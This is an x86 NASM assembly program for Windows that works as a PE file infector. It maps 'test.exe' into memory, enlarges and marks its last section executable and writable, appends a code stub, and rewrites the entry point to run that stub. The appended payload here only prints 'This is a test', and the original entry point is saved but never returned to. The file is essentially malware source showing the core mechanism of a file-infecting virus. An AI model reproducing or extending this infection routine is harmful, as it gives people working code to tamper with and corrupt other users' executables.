
[BITS 32]

extern CreateFileA
extern CloseHandle
extern CreateFileMappingA
extern GetFileSize
extern MapViewOfFile
extern FlushViewOfFile
extern UnmapViewOfFile	
extern printf

SECTION .text
	global main

main:
	push ebp
	mov ebp, esp
	sub esp, 4			; File handle
	sub esp, 4			; File size
	sub esp, 4			; Mapping handle
	sub esp, 4			; Mapping address
	sub esp, 4			; Old entry point
	
	;	Create file
	xor edi, edi
	push edi			; hTemplateFile is NULL
	push edi			; dwFlagsAndAttributes = NULL mean any file
	push 0x3			; dwCreationDisposition = OPEN_EXISTING
	push edi			; security option should be 0
	push edi			; dwShareMode = 0 to prevent other processes from open file
	push 0xC0000000		; dwDesiredAccess = (GENERIC_READ | GENERIC_WRITE)
	push dword fname
		call CreateFileA
	mov dword [ebp-4], eax	; Save file handle
	
	;	get file size
	push edi
	push dword [ebp-4]
		call GetFileSize
	add eax, prog_sz		; New size = original size + prog size + extra
	add eax, 100h
	mov dword [ebp-8], eax	; Save file size
	
	;	Create mapping file
	xor edi, edi
	push edi		; Mapping file have no name
	push dword [ebp-8] ; dwMaximumSizeLow = file size 
	push edi		; dwMaximumSizeHigh == NULL
	push 0x04		; Open in readwrite
	push edi		; lpAttribute == NULL
	push dword [ebp-4]	; File handle
		call CreateFileMappingA
	mov [ebp-12], eax	; Save mapping handle
	
	;	Open map file
	push dword [ebp-8]	; dwNumberOfBytesToMap = filesize
	push edi			; file offset where the view begin == NULL
	push edi			; file offset where the view end == NULL
	push dword 2		; dwDesiredAccess = file map write
	push dword [ebp-12]	; file map handle
		call MapViewOfFile
	mov edx, eax
	mov [ebp-16], eax	; Save mapping address
	
begin_infection:
	
	;	Check for MZ header
	cmp	word [edx], 'MZ'
	jne	end_infection
	
	;	Check for real PE file
	add edx, dword [edx + 3ch]
	cmp word [edx], 'PE'
	jne end_infection
	
	;	Go to Section table
	mov esi, edx
	add esi, 18h
	movzx eax, word [edx + 14h]
	add esi, eax
	
	;	Get number of sections
	xor ecx, ecx
	mov cx, word [edx + 06h]	; Load number of sections
	mov edi, esi
	xor eax, eax
	push ecx
	
x_sections:
	cmp dword [edi + 14h], eax
	jz not_biggest
	mov ebx, ecx	; Put the number of sections in ebx
	mov eax, [edi + 14h]	; get pointer
not_biggest:
	add edi, 28h	; Go to next section
	loop x_sections
	
	pop cx		; substract to the
	sub ecx, ebx	; number of sections
	
	;	Go the the last section
	mov eax, 028h
	push edx	; Save PE header
	mul ecx
	pop edx
	add esi, eax	; esi save the offset of the last section
					; on section table
	
	;	Adjust VirtualSize to put prog in
	mov edi, [esi + 10h] ; Save PointerToRawData
	mov eax, prog_sz
	xadd [esi + 8h], eax ; exachange and add to destination
	push eax			 ; save VirtualSize before adding new code
	add  eax, prog_sz
	
	; Adjust SizeOfRawData
	push edx
	mov ecx, [edx + 03ch] ; Get alignment
	xor edx, edx
	div ecx		; Divide eax = last segment size + prog size by alignemnt
	xor edx, edx
	inc eax		; Plus 1 --> Round UP
	mul ecx		; multiply the alignment plus eax
	mov ecx, eax
	mov [esi + 10h], eax ; Update SizeOfRawData
	pop edx
	
	; Get the entry point
	pop ebx					; VirtualSize before adding prog_sz
	add ebx, [esi + 0ch]	; New entry point
	mov eax, [edx + 28h]	; Load old entry point
	mov [ebp-20], eax
	mov [edx + 28h], ebx	; Set new entry point
	
	; Ajust overall file size
	sub ecx, edi
	add [edx+50h], ecx	; Add to SizeOfImage
	
	; Set last segment flags
	; 00000020 --> code
	; 20000000 --> executable
	; 80000000 --> writable
	or dword [esi + 24h], 0A0000020h
	
	; Copy code
	mov edi, [ebp-16]
	add edi, [esi + 14h]
	add edi, [esi + 8h]
	mov ecx, prog_sz
	sub edi, ecx		; Old length
	mov esi, prog_start
	rep movsb
	
end_infection:
	push ecx
	push msg
		call printf
	push dword [ebp-16]
		call FlushViewOfFile
	push dword [ebp-16]
		call UnmapViewOfFile
	push dword [ebp-12]
		call CloseHandle
	push dword [ebp-4]
		call CloseHandle

	leave
	ret

prog_start:
	push ebp
	mov ebp, esp
	call _here
_here:
	pop eax
	add eax, msg - _here
	push eax
		call printf
	leave
	ret
	msg db "This is a test", 10, 0
prog_end:


SECTION .data
	fname db "test.exe", 0
	prog_sz equ prog_end - prog_start
